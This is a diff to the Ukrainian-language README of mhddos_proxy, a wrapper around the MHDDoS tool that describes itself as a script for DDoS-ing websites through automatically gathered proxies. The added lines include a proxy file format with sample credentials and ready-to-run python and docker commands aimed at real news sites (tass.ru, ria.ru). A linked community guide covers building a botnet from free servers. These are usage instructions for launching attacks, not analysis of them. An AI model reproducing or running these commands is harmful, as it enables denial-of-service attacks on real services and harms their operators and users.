@@ -1,4 +1,4 @@
-Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).
+## Скрипт для DDoS-у сайтів, який автоматично шукає та підтягує робочі проксі в атаку  
 
 - **Не потребує VPN** - скачує і підбирає робочі проксі для атаки (доступний режим `--vpn` за бажанням)
 - Атака **декількох цілей** з автоматичним балансуванням навантаження
@@ -71,8 +71,6 @@
 
 ### 🐳 Комьюніті
 - [1. Детальний розбір mhddos_proxy та інструкції по встановленню](docs/installation.md)
-- [2. Детальний розбір MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
-- [Utility for converting shared targets into config format](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
 - [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
 - [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
 - [Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
@@ -100,7 +98,7 @@
       --debug                Print log as text
       --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
-      --proxies URL|path     URL or local path to file with proxies to use
+      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
       --udp-threads 1        Total number of threads to run for UDP sockets (defaults to 1)
       --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
                              Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)
@@ -109,23 +107,33 @@
 
 #### Формат файлу:
 
-    114.231.123.38:1234
-    username:password@114.231.123.38:3065
-    socks5://114.231.155.38:5678
-    socks4://username:password@114.231.123.38:3065
+    IP:PORT
+    IP:PORT:username:password
+    username:password@IP:PORT
+    protocol://IP:PORT
+    protocol://IP:PORT:username:password
+    protocol://username:password@IP:PORT
+де `protocol` може бути одним з 3-ох: http | socks4 | socks5, якщо `protocol`не вказувати, то буде обрано за замовчуванням - http  
+наприклад для публічного проксі: protocol=socks4 IP=114.231.123.38 PORT=3065 формат буде таким:  
+```shell
+socks4://114.231.123.38:3065
+```
+а для приватного: protocol=socks4 IP=114.231.123.38 PORT=3065 username=isdfuser password=ashd1spass формат може бути одним з таких:  
+```shell
+socks4://114.231.123.38:3065:isdfuser:ashd1spass
+socks4://isdfuser:ashd1spass@IP:PORT
+```
+  
+**URL - Віддалений файл для Python та Docker**
 
-#### Віддалений файл (однаково для Python та Docker)
-
-    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
-
-#### Для Python
-
-Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
+    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
+де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
+  
+**path - Для Python**  
+  
+Покладіть файл у папку з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
 
     python3 runner.py --proxies proxies.txt https://ria.ru
 
-#### Для Docker
-Потрібно монтувати volume щоби Docker мав доступ до файлу.  
-Обов'язково вказувати абсолютний шлях до файлу і не загубити `/` перед іменем файлу
-
-    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
+де proxies.txt - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
